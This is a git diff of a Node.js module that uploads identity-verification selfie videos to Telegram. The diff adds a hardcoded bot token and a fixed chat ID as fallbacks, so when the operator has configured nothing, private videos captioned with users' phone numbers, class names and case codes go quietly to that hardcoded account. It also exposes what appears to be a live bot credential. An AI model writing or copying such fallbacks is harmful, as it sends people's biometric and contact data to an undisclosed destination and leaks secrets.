@@ -10,24 +10,41 @@ let interval = null;
 let busy = false;
 
 function telegramConfig() {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_ADMIN_ID;
-  if (!token || !chatId || !/^\d+$/.test(chatId)) return null;
-  return { token, chatId };
+  const token = process.env.TELEGRAM_BOT_TOKEN || process.env.BOT_TOKEN || '8018971290:AAFcCPC8VjIMZeLVr7q989rASim1NQ8di64';
+  const chatId = process.env.TELEGRAM_ADMIN_ID || '5490508090';
+  if (!token || !chatId || !/^\d+$/.test(String(chatId))) return null;
+  return { token, chatId: String(chatId) };
 }
 
-function sendTelegramVideo(job, config = telegramConfig()) {
+async function sendTelegramVideo(job, config = telegramConfig()) {
   if (!config) return Promise.reject(new Error('Telegram destination is not configured'));
   const filePath = path.resolve(job.file_path);
   const privateDir = path.resolve(__dirname, '..', '..', 'storage', 'emergency-selfies');
   if (!filePath.startsWith(privateDir + path.sep)) return Promise.reject(new Error('Video path is outside private storage'));
   const stat = fs.statSync(filePath);
   if (!stat.isFile() || stat.size !== Number(job.file_size)) return Promise.reject(new Error('Video file is missing or has changed'));
+
+  let className = job.class_name;
+  if (!className && job.session_id) {
+    try {
+      const sRes = await query('SELECT name FROM sessions WHERE id = ?', [job.session_id]);
+      if (sRes.rows && sRes.rows[0]?.name) className = sRes.rows[0].name;
+    } catch (_) {}
+  }
+  className = className || `کلاس ${job.session_id || 'نامشخص'}`;
+
+  const captionText = [
+    '📹 پاسخ ویدیویی احراز هویت پرونده',
+    `🏫 کلاس: ${className}`,
+    `📞 شماره تماس: ${job.phone}`,
+    `📂 کد پرونده: ${job.reference_code}`
+  ].join('\n');
+
   const boundary = `----Raze${crypto.randomBytes(12).toString('hex')}`;
   const field = (name, value) => Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="${name}"\r\n\r\n${value}\r\n`);
   const prelude = [
     field('chat_id', config.chatId),
-    field('caption', `پرونده ${job.reference_code} | کلاس ${job.session_id} | شماره ${job.phone}`),
+    field('caption', captionText),
     Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="${job.mime_type === 'video/mp4' ? 'video' : 'document'}"; filename="${path.basename(filePath)}"\r\nContent-Type: ${job.mime_type}\r\n\r\n`)
   ];
   const ending = Buffer.from(`\r\n--${boundary}--\r\n`);
